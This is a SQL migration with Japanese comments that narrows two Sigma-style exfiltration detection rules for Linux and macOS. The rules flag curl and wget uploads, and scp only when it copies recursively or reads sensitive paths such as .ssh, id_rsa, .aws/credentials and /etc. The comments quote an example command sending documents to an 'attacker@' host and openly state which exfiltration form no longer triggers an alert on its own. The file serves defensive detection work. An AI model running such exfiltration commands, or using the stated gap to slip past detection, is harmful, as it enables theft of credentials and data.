-- 429: 素の scp では鳴らないようにする（T1048 / T1041）
--
-- 対象は 2 本:
--
--   Data Exfiltration via curl/wget Upload (Linux)   migration 371   6 件
--   macOS Data Exfiltration via curl or scp Upload   migration 386   3 件
--
-- どちらも `scp_out: CommandLine|contains: 'scp '` という**修飾なしの 1 語**を
-- 単独の発火条件に持っていた。
--
-- ── ルール自身の中に不整合があった ──
--
-- 同じルールの他の枝は上げ側を修飾している:
--
--   curl  → ' -F ' / ' -T ' / ' --upload-file' / ' --data-binary @' を要求
--   wget  → ' --post-file' / ' --body-file' を要求
--   scp   → **何も要求しない**
--
-- curl は取得にも送信にも使えるのでフラグで向きを判別する必要があるが、scp は
-- そもそも転送コマンドである。つまり「scp が動いた」＝「誰かが ssh 越しに
-- ファイルをコピーした」でしかなく、**日常のデプロイと区別がつかない**。
-- T1529 の Unix ルール（migration 428）と同型の内部不整合である。
--
-- ── 鳴っていた良性（全プロファイル）──
--
--   scp dist/app.tar.gz deploy@10.21.0.9:/srv/releases/       単一成果物の push
--   scp deploy@10.21.0.9:/var/log/app.log ./tmp/              ログの取得
--   scp ./dist/app-{{rand}}.zip deploy@...:/srv/releases/     単一成果物の push
--   scp deploy@...:/var/log/app.log /Users/{{user}}/Downloads/ ログの取得
--
-- **いずれも -r を使わない。** 単一のファイルを置く／取るだけである。
--
-- ── 修飾の根拠はリポジトリに既にある ──
--
-- migration 306 の Linux キルチェーン相関は、stage_2 に素の scp ではなく
-- **`scp /etc` / `scp ~/.ssh`** と機微パスで修飾して置いている。また
-- correlation_killchains_test.go の相関は素の `scp ` を stage_2 に置くが、
-- そちらは stage_1（アーカイブ作成）とセットでしか成立しない。
--
-- **弱い信号の置き場所は既にある。** 単独アラートとして無修飾で鳴らしているのは
-- この 2 本だけが外れ値だった。そこで
--
--   再帰コピー (-r)            収集はディレクトリ単位。デプロイは単一成果物
--   機微パス (/etc, /.ssh, …)  306 の相関が既に採っている修飾
--
-- のいずれかを要求する形にした。固定されている攻撃ケース
-- (dark_technique_wave3_test.go:82 の `scp -r /Users/v/Documents attacker@...`) は
-- -r を含むので緑のまま、306 の `scp /etc` 系も引き続き当たる。
--
-- ── 取りこぼす形も明記しておく ──
--
-- `scp file1 file2 attacker@host:` のように -r も機微パスも使わない持ち出しは
-- **単独では鳴らなくなる**。これは意図した取引で、その形はアーカイブ作成との
-- 相関（collection→exfil キルチェーン）が拾う層である。無修飾の単独アラートに
-- 戻すと、デプロイのたびに鳴る状態に戻る。

UPDATE rules
SET content = $$title: Data Exfiltration via curl/wget Upload (Linux)
description: Detects outbound file upload on Linux via curl multipart/upload flags, wget POST-file flags, or a bulk/sensitive scp transfer — the transfer step that follows staging and archiving. A plain single-file scp is ordinary deployment traffic and is deliberately NOT matched; the qualifier is recursion or a sensitive source path, mirroring the killchain correlation in migration 306.
status: stable
level: medium
tags:
  - attack.t1048
  - attack.exfiltration
logsource:
  product: linux
  category: process_creation
detection:
  curl_bin:
    CommandLine|contains: 'curl'
  curl_upload:
    CommandLine|contains:
      - ' -F '
      - ' --form'
      - ' -T '
      - ' --upload-file'
      - ' --data-binary @'
      - ' -d @'
  wget_bin:
    CommandLine|contains: 'wget'
  wget_post:
    CommandLine|contains:
      - ' --post-file'
      - ' --body-file'
  scp_bin:
    CommandLine|contains: 'scp '
  scp_bulk:
    CommandLine|contains: ' -r'
  scp_sensitive:
    CommandLine|contains:
      - ' /etc'
      - '/.ssh'
      - ' /root'
      - shadow
      - id_rsa
      - '.aws/credentials'
      - '.kube/config'
  condition: (curl_bin and curl_upload) or (wget_bin and wget_post) or (scp_bin and (scp_bulk or scp_sensitive))
falsepositives:
  - A backup script that recursively copies a directory tree off-host over ssh$$,
    updated_at = now()
WHERE name = 'Data Exfiltration via curl/wget Upload (Linux)';

UPDATE rules
SET content = $$title: macOS Data Exfiltration via curl or scp Upload
id: e0f1c0de-0317-0003-0003-000000000003
status: stable
description: Detects file upload from macOS shells via curl multipart/upload-file, or a bulk/sensitive scp transfer, used to move collected or staged data over a C2 or web channel. A plain single-file scp is ordinary deployment traffic and is deliberately NOT matched.
references:
  - https://attack.mitre.org/techniques/T1041/
logsource:
  product: macos
  category: process_creation
detection:
  curl_tool:
    CommandLine|contains: curl
  curl_upload_flag:
    CommandLine|contains:
      - ' -F '
      - ' --form'
      - ' -T '
      - ' --upload-file'
      - ' --data-binary @'
      - ' -d @'
  scp_bin:
    CommandLine|contains: 'scp '
  scp_bulk:
    CommandLine|contains: ' -r'
  scp_sensitive:
    CommandLine|contains:
      - ' /etc'
      - '/.ssh'
      - ' /root'
      - shadow
      - id_rsa
      - '.aws/credentials'
      - '.kube/config'
  condition: (curl_tool and curl_upload_flag) or (scp_bin and (scp_bulk or scp_sensitive))
falsepositives:
  - A backup script that recursively copies a directory tree off-host over ssh
level: high$$,
    updated_at = now()
WHERE name = 'macOS Data Exfiltration via curl or scp Upload';
